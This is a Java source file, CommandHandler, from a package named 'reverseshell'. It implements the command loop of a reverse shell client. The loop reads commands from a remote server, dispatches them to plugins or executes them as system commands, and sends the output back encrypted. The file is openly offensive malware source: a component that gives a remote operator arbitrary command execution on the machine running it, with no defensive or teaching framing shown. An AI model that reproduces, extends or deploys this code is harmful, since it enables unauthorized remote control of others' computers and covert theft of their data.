package obs1d1anc1ph3r.reverseshell;

import obs1d1anc1ph3r.reverseshell.plugins.PluginManager;
import java.io.*;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.plugins.CommandPlugin;

public class CommandHandler {

	private static final Logger logger = Logger.getLogger(CommandHandler.class.getName());
	private final ServerConnection serverConnection;
	private final PluginManager pluginManager;
	private final CommandExecutor commandExecutor;

	public CommandHandler(ServerConnection serverConnection, PluginManager pluginManager) {
		this.commandExecutor = new CommandExecutor();
		this.serverConnection = serverConnection;
		this.pluginManager = pluginManager;
	}

	//Handle commands here
	public void handleCommands() throws IOException, Exception {
		String command;
		while ((command = serverConnection.readCommand()) != null) {
			if (command.equalsIgnoreCase("exit")) {
				logger.info("Server disconnected.");
				break;
			}

			//Split the command stuff
			String[] commandParts = command.split(" ", 2);
			String commandName = commandParts[0].toLowerCase();
			//If the command starts with a plugin, get it
			CommandPlugin plugin = pluginManager.getPlugin(commandName);

			if (plugin != null) {
				//Do the plugin thing
				String response = plugin.execute(commandParts.length > 1 ? new String[]{commandParts[1]} : new String[]{});
				if (response != null && !response.isEmpty()) {
					serverConnection.sendEncryptedResponse(response);
				}
			} else {
				String response = commandExecutor.executeCommand(command);
				serverConnection.sendEncryptedResponse(response);
			}
		}
	}

}
